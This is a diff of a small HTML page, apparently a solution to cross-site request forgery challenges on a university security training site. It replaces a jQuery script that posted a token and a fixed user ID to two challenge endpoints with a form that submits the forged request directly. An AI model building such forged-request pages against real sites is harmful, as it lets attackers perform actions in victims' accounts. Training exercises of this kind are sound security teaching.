@@ -1,37 +1,5 @@
-<form id="leForm" action="javascript:;">
-  <a>Enter your token here: </a>
-  <input id="csrfToken" type="text" value="">
-  <br>
+<form id="leForm" action="https://snickerboa.it.liu.se/user/csrfchallengethree/plusplus ">
+  <input type="text" name="csrfToken" value="" placeholder="Token goes here...">
+  <input type="hidden" name="userid" value="86109c9eed773b92480275854966986d3c4901a6">
   <input type="submit" value="Get Result Key For CSRF2">
 </form>
-
-<a id="challenge_3"></a>
-<a id="challenge_5"></a>
-
-<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
-<script>
-  $("#leForm").submit(function(){
-	var _csrfToken = $("#csrfToken").val();
-        document.getElementById("challenge_3").innerHTML = $.ajax({
-          dataType: "text",
-          type: "POST",
-          url: "https://snickerboa.it.liu.se/user/csrfchallengethree/plusplus",
-          data: {
-            userid: "86109c9eed773b92480275854966986d3c4901a6",
-            csrfToken: _csrfToken
-          },
-          async: false
-        }).responseText;
-    
-        document.getElementById("challenge_5").innerHTML = $.ajax({
-	  dataType: "text",
-          type: "POST",
-          url: "https://snickerboa.it.liu.se/user/csrfchallengefive/plusplus",
-          data: {
-            userid: "86109c9eed773b92480275854966986d3c4901a6",
-            csrfToken: _csrfToken
-          },
-          async: false
-        }).responseText;
-    });
-</script>
